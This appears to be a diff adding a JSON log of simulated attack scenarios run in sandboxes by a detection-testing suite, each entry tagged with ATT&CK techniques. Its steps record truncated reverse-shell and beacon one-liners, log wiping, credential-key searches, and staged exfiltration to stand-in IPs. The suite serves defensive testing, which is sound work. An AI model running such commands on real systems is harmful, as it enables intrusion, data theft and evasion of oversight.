+   "scenario": "discovery",
+   "tactic": "discovery",
+   "techniques": [
+    "T1082",
+    "T1033",
+    "T1057",
+    "T1049"
+   ],
+   "seed": 696482298,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-6-suite-discovery",
+   "start_ns": 1793726059177322358,
+   "end_ns": 1793726059396789387,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-6-suite-discovery",
+    "/var/lib/pdp/sandbox/d1736121600000000000-6-suite-discovery/.wtnu.log",
+    "198.51.100.221 41797"
+   ],
+   "steps": [
+    "/usr/bin/whoami",
+    "/bin/cat /etc/hosts",
+    "/bin/cat /proc/version",
+    "/usr/bin/id",
+    "/bin/hostname",
+    "/bin/ls -la /home",
+    "/bin/cat /proc/cpuinfo",
+    "tcp 198.51.100.221:41797"
+   ]
+  },
+  {
+   "scenario": "privesc_discovery",
+   "tactic": "privilege-escalation",
+   "techniques": [
+    "T1548.001"
+   ],
+   "seed": 247711695,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-7-suite-privesc_discovery",
+   "start_ns": 1793726063546658370,
+   "end_ns": 1793726063578516387,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-7-suite-privesc_discovery",
+    "/var/lib/pdp/sandbox/d1736121600000000000-7-suite-privesc_discovery/.62ed0/suid.txt"
+   ],
+   "steps": [
+    "/bin/sh -c find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null > /var/lib/pdp/sandbox/d1736121600000000000-7-suite-p"
+   ]
+  },
+  {
+   "scenario": "discovery",
+   "tactic": "discovery",
+   "techniques": [
+    "T1082",
+    "T1033",
+    "T1057",
+    "T1049"
+   ],
+   "seed": 1044630970,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-8-suite-discovery",
+   "start_ns": 1793726063767334238,
+   "end_ns": 1793726063998705545,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-8-suite-discovery",
+    "/var/lib/pdp/sandbox/d1736121600000000000-8-suite-discovery/.mtjq.log",
+    "203.0.113.167 53"
+   ],
+   "steps": [
+    "/usr/bin/id",
+    "/bin/cat /etc/hosts",
+    "/bin/ps -ef",
+    "/bin/cat /proc/version",
+    "/bin/cat /proc/net/tcp",
+    "tcp 203.0.113.167:53"
+   ]
+  },
+  {
+   "scenario": "reverse_shell",
+   "tactic": "execution/c2",
+   "techniques": [
+    "T1059.004",
+    "T1071"
+   ],
+   "seed": 408835463,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-10-suite-reverse_shell",
+   "start_ns": 1793726082595568479,
+   "end_ns": 1793726082862402537,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-10-suite-reverse_shell",
+    "/var/lib/pdp/sandbox/d1736121600000000000-10-suite-reverse_shell/.local/bin/python3",
+    "192.0.2.148 8443"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-10-suite-reverse_shell/.local/bin/python3 -c import socket,subprocess;s=socket"
+   ]
+  },
+  {
+   "scenario": "drop_and_execute",
+   "tactic": "execution",
+   "techniques": [
+    "T1105",
+    "T1204.002",
+    "T1059.004"
+   ],
+   "seed": 34808623,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-12-suite-drop_and_execute",
+   "start_ns": 1793726083345079342,
+   "end_ns": 1793726083822895996,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-12-suite-drop_and_execute",
+    "/var/lib/pdp/sandbox/d1736121600000000000-12-suite-drop_and_execute/tmp/.fa6maw",
+    "203.0.113.192 53"
+   ],
+   "steps": [
+    "tcp 203.0.113.192:53",
+    "/bin/chmod +x /var/lib/pdp/sandbox/d1736121600000000000-12-suite-drop_and_execute/tmp/.fa6maw",
+    "/var/lib/pdp/sandbox/d1736121600000000000-12-suite-drop_and_execute/tmp/.fa6maw"
+   ]
+  },
+  {
+   "scenario": "masquerade_and_cleanup",
+   "tactic": "defense-evasion",
+   "techniques": [
+    "T1036.005",
+    "T1070.004"
+   ],
+   "seed": 251543977,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-14-suite-masquerade_and_cleanup",
+   "start_ns": 1793726089380481675,
+   "end_ns": 1793726089400431931,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-14-suite-masquerade_and_cleanup",
+    "/var/lib/pdp/sandbox/d1736121600000000000-14-suite-masquerade_and_cleanup/dev/shm/systemd-updater"
+   ],
+   "steps": [
+    "/bin/cp /bin/sh /var/lib/pdp/sandbox/d1736121600000000000-14-suite-masquerade_and_cleanup/dev/shm/systemd-updater",
+    "/var/lib/pdp/sandbox/d1736121600000000000-14-suite-masquerade_and_cleanup/dev/shm/systemd-updater -c cat /etc/hostname >",
+    "/bin/sh -c : > /var/lib/pdp/sandbox/d1736121600000000000-14-suite-masquerade_and_cleanup/var/log/auth.log; rm -f /var/li"
+   ]
+  },
+  {
+   "scenario": "lateral_movement",
+   "tactic": "lateral-movement",
+   "techniques": [
+    "T1021.004",
+    "T1570"
+   ],
+   "seed": 473435402,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-15-suite-lateral_movement",
+   "start_ns": 1793726089580778009,
+   "end_ns": 1793726090785075199,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-15-suite-lateral_movement",
+    "/var/lib/pdp/sandbox/d1736121600000000000-15-suite-lateral_movement/tmp/udevadm-sync",
+    "192.0.2.116 5985",
+    "192.0.2.27 3389",
+    "198.51.100.197 3389",
+    "198.51.100.71 22",
+    "203.0.113.157 5985",
+    "203.0.113.21 139"
+   ],
+   "steps": [
+    "/bin/cp /bin/ls /var/lib/pdp/sandbox/d1736121600000000000-15-suite-lateral_movement/tmp/udevadm-sync",
+    "tcp 192.0.2.27:3389",
+    "tcp 198.51.100.197:3389",
+    "tcp 192.0.2.116:5985",
+    "tcp 203.0.113.21:139",
+    "tcp 203.0.113.157:5985",
+    "tcp 198.51.100.71:22"
+   ]
+  },
+  {
+   "scenario": "persistence_cron",
+   "tactic": "persistence",
+   "techniques": [
+    "T1053.003"
+   ],
+   "seed": 366106816,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-17-suite-persistence_cron",
+   "start_ns": 1793726095450128164,
+   "end_ns": 1793726095450320126,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-17-suite-persistence_cron",
+    "/var/lib/pdp/sandbox/d1736121600000000000-17-suite-persistence_cron/.X11-unix/snapd-agent",
+    "/var/lib/pdp/sandbox/d1736121600000000000-17-suite-persistence_cron/etc/cron.d/5u5nb"
+   ],
+   "steps": []
+  },
+  {
+   "scenario": "cryptominer",
+   "tactic": "impact",
+   "techniques": [
+    "T1496"
+   ],
+   "seed": 714115950,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-18-suite-cryptominer",
+   "start_ns": 1793726095619004095,
+   "end_ns": 1793726096183899997,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-18-suite-cryptominer",
+    "/var/lib/pdp/sandbox/d1736121600000000000-18-suite-cryptominer/.local/bin/xmrig",
+    "198.51.100.38 5555"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-18-suite-cryptominer/.local/bin/xmrig -c import socket,time\nt=time.time()\nwhil"
+   ]
+  },
+  {
+   "scenario": "lateral_movement",
+   "tactic": "lateral-movement",
+   "techniques": [
+    "T1021.004",
+    "T1570"
+   ],
+   "seed": 915109644,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-19-suite-lateral_movement",
+   "start_ns": 1793726096350114832,
+   "end_ns": 1793726096953162602,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-19-suite-lateral_movement",
+    "/var/lib/pdp/sandbox/d1736121600000000000-19-suite-lateral_movement/tmp/systemd-updater",
+    "192.0.2.169 22",
+    "192.0.2.97 5985",
+    "198.51.100.128 3389"
+   ],
+   "steps": [
+    "/bin/cp /bin/ls /var/lib/pdp/sandbox/d1736121600000000000-19-suite-lateral_movement/tmp/systemd-updater",
+    "tcp 198.51.100.128:3389",
+    "tcp 192.0.2.97:5985",
+    "tcp 192.0.2.169:22"
+   ]
+  },
+  {
+   "scenario": "drop_and_execute",
+   "tactic": "execution",
+   "techniques": [
+    "T1105",
+    "T1204.002",
+    "T1059.004"
+   ],
+   "seed": 133557282,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-20-suite-drop_and_execute",
+   "start_ns": 1793726097169431021,
+   "end_ns": 1793726097646164249,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-20-suite-drop_and_execute",
+    "/var/lib/pdp/sandbox/d1736121600000000000-20-suite-drop_and_execute/.local/bin/kthreadd2",
+    "192.0.2.214 31337"
+   ],
+   "steps": [
+    "tcp 192.0.2.214:31337",
+    "/bin/chmod +x /var/lib/pdp/sandbox/d1736121600000000000-20-suite-drop_and_execute/.local/bin/kthreadd2",
+    "/var/lib/pdp/sandbox/d1736121600000000000-20-suite-drop_and_execute/.local/bin/kthreadd2"
+   ]
+  },
+  {
+   "scenario": "persistence_cron",
+   "tactic": "persistence",
+   "techniques": [
+    "T1053.003"
+   ],
+   "seed": 216052998,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-21-suite-persistence_cron",
+   "start_ns": 1793726101432666819,
+   "end_ns": 1793726101432866213,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-21-suite-persistence_cron",
+    "/var/lib/pdp/sandbox/d1736121600000000000-21-suite-persistence_cron/.X11-unix/polkit-auth",
+    "/var/lib/pdp/sandbox/d1736121600000000000-21-suite-persistence_cron/etc/cron.d/0hourly"
+   ],
+   "steps": []
+  },
+  {
+   "scenario": "persistence_ssh_key",
+   "tactic": "persistence",
+   "techniques": [
+    "T1098.004"
+   ],
+   "seed": 469812643,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-23-suite-persistence_ssh_key",
+   "start_ns": 1793726101773776784,
+   "end_ns": 1793726101775140480,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-23-suite-persistence_ssh_key",
+    "/var/lib/pdp/sandbox/d1736121600000000000-23-suite-persistence_ssh_key/root/.ssh/authorized_keys"
+   ],
+   "steps": [
+    "/bin/chmod 600 /var/lib/pdp/sandbox/d1736121600000000000-23-suite-persistence_ssh_key/root/.ssh/authorized_keys"
+   ]
+  },
+  {
+   "scenario": "credential_access",
+   "tactic": "credential-access",
+   "techniques": [
+    "T1003.008",
+    "T1552.004"
+   ],
+   "seed": 158907135,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-25-suite-credential_access",
+   "start_ns": 1793726104836495216,
+   "end_ns": 1793726104838383032,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-25-suite-credential_access",
+    "/var/lib/pdp/sandbox/d1736121600000000000-25-suite-credential_access/.cache/qkua5pu/loot.txt"
+   ],
+   "steps": [
+    "/usr/bin/find /var/lib/pdp/sandbox/d1736121600000000000-25-suite-credential_access/home -name id_*"
+   ]
+  },
+  {
+   "scenario": "interpreter_beacon",
+   "tactic": "command-and-control",
+   "techniques": [
+    "T1059.006",
+    "T1071.001",
+    "T1029"
+   ],
+   "seed": 267240857,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-27-suite-interpreter_beacon",
+   "start_ns": 1793726104998261870,
+   "end_ns": 1793726105918001083,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-27-suite-interpreter_beacon",
+    "/var/lib/pdp/sandbox/d1736121600000000000-27-suite-interpreter_beacon/.local/bin/dbus-helper",
+    "198.51.100.195 443"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-27-suite-interpreter_beacon/.local/bin/dbus-helper -c import socket,subprocess"
+   ]
+  },
+  {
+   "scenario": "staged_exfiltration",
+   "tactic": "collection/exfiltration",
+   "techniques": [
+    "T1005",
+    "T1074.001",
+    "T1560.001",
+    "T1041"
+   ],
+   "seed": 404844946,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-28-suite-staged_exfiltration",
+   "start_ns": 1793726110201414426,
+   "end_ns": 1793726110611075388,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-28-suite-staged_exfiltration",
+    "/var/lib/pdp/sandbox/d1736121600000000000-28-suite-staged_exfiltration/tmp/.nwx2w.tar",
+    "/var/lib/pdp/sandbox/d1736121600000000000-28-suite-staged_exfiltration/tmp/.nwx2w.tar.gz",
+    "198.51.100.231 31337"
+   ],
+   "steps": [
+    "/bin/tar cf /var/lib/pdp/sandbox/d1736121600000000000-28-suite-staged_exfiltration/tmp/.nwx2w.tar /var/lib/pdp/sandbox/d",
+    "/bin/gzip -f /var/lib/pdp/sandbox/d1736121600000000000-28-suite-staged_exfiltration/tmp/.nwx2w.tar",
+    "tcp 198.51.100.231:31337",
+    "tcp 198.51.100.231:31337"
+   ]
+  },
+  {
+   "scenario": "staged_exfiltration",
+   "tactic": "collection/exfiltration",
+   "techniques": [
+    "T1005",
+    "T1074.001",
+    "T1560.001",
+    "T1041"
+   ],
+   "seed": 840115818,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-30-suite-staged_exfiltration",
+   "start_ns": 1793726111116911713,
+   "end_ns": 1793726112332436783,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-30-suite-staged_exfiltration",
+    "/var/lib/pdp/sandbox/d1736121600000000000-30-suite-staged_exfiltration/tmp/.f8khv.tar",
+    "/var/lib/pdp/sandbox/d1736121600000000000-30-suite-staged_exfiltration/tmp/.f8khv.tar.gz",
+    "203.0.113.167 4444"
+   ],
+   "steps": [
+    "/bin/tar cf /var/lib/pdp/sandbox/d1736121600000000000-30-suite-staged_exfiltration/tmp/.f8khv.tar /var/lib/pdp/sandbox/d",
+    "/bin/gzip -f /var/lib/pdp/sandbox/d1736121600000000000-30-suite-staged_exfiltration/tmp/.f8khv.tar",
+    "tcp 203.0.113.167:4444",
+    "tcp 203.0.113.167:4444",
+    "tcp 203.0.113.167:4444",
+    "tcp 203.0.113.167:4444",
+    "tcp 203.0.113.167:4444",
+    "tcp 203.0.113.167:4444"
+   ]
+  },
+  {
+   "scenario": "ransomware",
+   "tactic": "impact",
+   "techniques": [
+    "T1486",
+    "T1083"
+   ],
+   "seed": 196563160,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-31-suite-ransomware",
+   "start_ns": 1793726118677627375,
+   "end_ns": 1793726118720606293,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-31-suite-ransomware",
+    "/var/lib/pdp/sandbox/d1736121600000000000-31-suite-ransomware/.local/bin/kthreadd2-x",
+    "/var/lib/pdp/sandbox/d1736121600000000000-31-suite-ransomware/home/ik38h/Pictures/README_RESTORE.txt",
+    "/var/lib/pdp/sandbox/d1736121600000000000-31-suite-ransomware/tmp/kthreadd2",
+    "192.0.2.238 1337"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-31-suite-ransomware/tmp/kthreadd2",
+    "/var/lib/pdp/sandbox/d1736121600000000000-31-suite-ransomware/.local/bin/kthreadd2-x -c import os\nfor p in ['/var/lib/pd",
+    "tcp 192.0.2.238:1337"
+   ]
+  },
+  {
+   "scenario": "cryptominer",
+   "tactic": "impact",
+   "techniques": [
+    "T1496"
+   ],
+   "seed": 794869471,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-32-suite-cryptominer",
+   "start_ns": 1793726118868936922,
+   "end_ns": 1793726119435146860,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-32-suite-cryptominer",
+    "/var/lib/pdp/sandbox/d1736121600000000000-32-suite-cryptominer/.local/bin/xmrig",
+    "192.0.2.106 4444"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-32-suite-cryptominer/.local/bin/xmrig -c import socket,time\nt=time.time()\nwhil"
+   ]
+  },
+  {
+   "scenario": "ransomware",
+   "tactic": "impact",
+   "techniques": [
+    "T1486",
+    "T1083"
+   ],
+   "seed": 249207194,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-33-suite-ransomware",
+   "start_ns": 1793726119666159944,
+   "end_ns": 1793726119901130493,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-33-suite-ransomware",
+    "/var/lib/pdp/sandbox/d1736121600000000000-33-suite-ransomware/.local/bin/polkit-auth",
+    "/var/lib/pdp/sandbox/d1736121600000000000-33-suite-ransomware/.local/bin/polkit-auth-x",
+    "/var/lib/pdp/sandbox/d1736121600000000000-33-suite-ransomware/home/j5a4n/Pictures/README_RESTORE.txt",
+    "192.0.2.208 8080"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-33-suite-ransomware/.local/bin/polkit-auth",
+    "/var/lib/pdp/sandbox/d1736121600000000000-33-suite-ransomware/.local/bin/polkit-auth-x -c import os\nfor p in ['/var/lib/",
+    "tcp 192.0.2.208:8080"
+   ]
+  },
+  {
+   "scenario": "ingress_tool_transfer",
+   "tactic": "command-and-control",
+   "techniques": [
+    "T1105"
+   ],
+   "seed": 46464059,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-35-suite-ingress_tool_transfer",
+   "start_ns": 1793726124477971849,
+   "end_ns": 1793726124793225474,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-35-suite-ingress_tool_transfer",
+    "/var/lib/pdp/sandbox/d1736121600000000000-35-suite-ingress_tool_transfer/.cache/.ma67f0",
+    "198.51.100.12 443"
+   ],
+   "steps": [
+    "/opt/venv/bin/python -c import urllib.request,os\ntry: urllib.request.urlopen('http://198.51.100.12:443/t', timeout=0.2)\n"
+   ]
+  },
+  {
+   "scenario": "persistence_ssh_key",
+   "tactic": "persistence",
+   "techniques": [
+    "T1098.004"
+   ],
+   "seed": 397224213,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-37-suite-persistence_ssh_key",
+   "start_ns": 1793726129647993909,
+   "end_ns": 1793726129649679063,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-37-suite-persistence_ssh_key",
+    "/var/lib/pdp/sandbox/d1736121600000000000-37-suite-persistence_ssh_key/root/.ssh/authorized_keys"
+   ],
+   "steps": [
+    "/bin/chmod 600 /var/lib/pdp/sandbox/d1736121600000000000-37-suite-persistence_ssh_key/root/.ssh/authorized_keys"
+   ]
+  },
+  {
+   "scenario": "interpreter_beacon",
+   "tactic": "command-and-control",
+   "techniques": [
+    "T1059.006",
+    "T1071.001",
+    "T1029"
+   ],
+   "seed": 1029146436,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-39-suite-interpreter_beacon",
+   "start_ns": 1793726129890184136,
+   "end_ns": 1793726131458398545,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-39-suite-interpreter_beacon",
+    "/var/lib/pdp/sandbox/d1736121600000000000-39-suite-interpreter_beacon/.local/bin/kthreadd2",
+    "192.0.2.163 1337"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-39-suite-interpreter_beacon/.local/bin/kthreadd2 -c import socket,subprocess,t"
+   ]
+  },
+  {
+   "scenario": "privesc_discovery",
+   "tactic": "privilege-escalation",
+   "techniques": [
+    "T1548.001"
+   ],
+   "seed": 452209613,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-40-suite-privesc_discovery",
+   "start_ns": 1793726136137998774,
+   "end_ns": 1793726136145719555,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-40-suite-privesc_discovery",
+    "/var/lib/pdp/sandbox/d1736121600000000000-40-suite-privesc_discovery/.acxg3/suid.txt"
+   ],
+   "steps": [
+    "/bin/sh -c find /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null > /var/lib/pdp/sandbox/d1736121600000000000-40-suite-"
+   ]
+  },
+  {
+   "scenario": "reverse_shell",
+   "tactic": "execution/c2",
+   "techniques": [
+    "T1059.004",
+    "T1071"
+   ],
+   "seed": 48925209,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-42-suite-reverse_shell",
+   "start_ns": 1793726136396783753,
+   "end_ns": 1793726136670232516,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-42-suite-reverse_shell",
+    "/var/lib/pdp/sandbox/d1736121600000000000-42-suite-reverse_shell/.local/bin/python3",
+    "198.51.100.177 1337"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-42-suite-reverse_shell/.local/bin/python3 -c import socket,subprocess;s=socket"
+   ]
+  },
+  {
+   "scenario": "web_shell",
+   "tactic": "initial-access/persistence",
+   "techniques": [
+    "T1190",
+    "T1505.003",
+    "T1059.004"
+   ],
+   "seed": 914009482,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-43-suite-web_shell",
+   "start_ns": 1793726136813451974,
+   "end_ns": 1793726137048813660,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-43-suite-web_shell",
+    "/var/lib/pdp/sandbox/d1736121600000000000-43-suite-web_shell/www/.out",
+    "/var/lib/pdp/sandbox/d1736121600000000000-43-suite-web_shell/www/upload/c6jil.php",
+    "198.51.100.237 443"
+   ],
+   "steps": [
+    "/bin/sh -c ps aux; whoami; id; uname -a; hostname; ls -la / > /var/lib/pdp/sandbox/d1736121600000000000-43-suite-web_she",
+    "tcp 198.51.100.237:443"
+   ]
+  },
+  {
+   "scenario": "exfil_dns_tunnel",
+   "tactic": "exfiltration",
+   "techniques": [
+    "T1048.003",
+    "T1071.004"
+   ],
+   "seed": 558173713,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-45-suite-exfil_dns_tunnel",
+   "start_ns": 1793726155637628561,
+   "end_ns": 1793726155669827640,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-45-suite-exfil_dns_tunnel",
+    "/var/lib/pdp/sandbox/d1736121600000000000-45-suite-exfil_dns_tunnel/.local/bin/dnsd",
+    "198.51.100.220 53"
+   ],
+   "steps": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-45-suite-exfil_dns_tunnel/.local/bin/dnsd -c import socket,base64\nd=base64.b32"
+   ]
+  },
+  {
+   "scenario": "masquerade_and_cleanup",
+   "tactic": "defense-evasion",
+   "techniques": [
+    "T1036.005",
+    "T1070.004"
+   ],
+   "seed": 150333092,
+   "root": "/var/lib/pdp/sandbox/d1736121600000000000-46-suite-masquerade_and_cleanup",
+   "start_ns": 1793726155864127577,
+   "end_ns": 1793726155880971584,
+   "markers": [
+    "/var/lib/pdp/sandbox/d1736121600000000000-46-suite-masquerade_and_cleanup",
+    "/var/lib/pdp/sandbox/d1736121600000000000-46-suite-masquerade_and_cleanup/.cache/kworker"
+   ],
+   "steps": [
+    "/bin/cp /bin/sh /var/lib/pdp/sandbox/d1736121600000000000-46-suite-masquerade_and_cleanup/.cache/kworker",
+    "/var/lib/pdp/sandbox/d1736121600000000000-46-suite-masquerade_and_cleanup/.cache/kworker -c cat /etc/hostname >/dev/null",
+    "/bin/sh -c : > /var/lib/pdp/sandbox/d1736121600000000000-46-suite-masquerade_and_cleanup/var/log/auth.log; rm -f /var/li"
+   ]
+  }
+ ]
+}
